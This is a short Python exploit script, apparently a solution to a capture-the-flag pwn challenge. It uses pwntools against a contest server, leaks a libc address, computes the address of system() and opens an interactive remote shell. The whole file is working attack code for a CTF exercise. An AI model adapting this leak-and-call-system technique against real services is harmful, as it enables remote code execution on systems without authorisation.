#!/usr/bin/python
import pwn

# abs addr is 0x7f6e093b6640 on server
# find it on libc database
# then get https://libc.blukat.me/?q=abs%3A640&l=libc6_2.23-0ubuntu11.2_amd64

sh_hex = pwn.unpack(b"sh\x00\x00", 32)
f = pwn.remote("pwn.utctf.live", 5432)
f.recvuntil(": ")
f.sendline("1")
f.recvuntil(": ")
f.sendline("%d" % sh_hex)
print(f.recvline())
print(f.recvline())
print(f.recvline())
print(f.recvline())
abs = f.recvline()

abs_addr = int(abs[7:-1], 16)
system_addr = abs_addr + 0xad60
f.sendline("%x" % system_addr)
print(f.recvline())
print(f.recvline())
print(f.recvline())
f.sendline("%x" % system_addr)
f.interactive()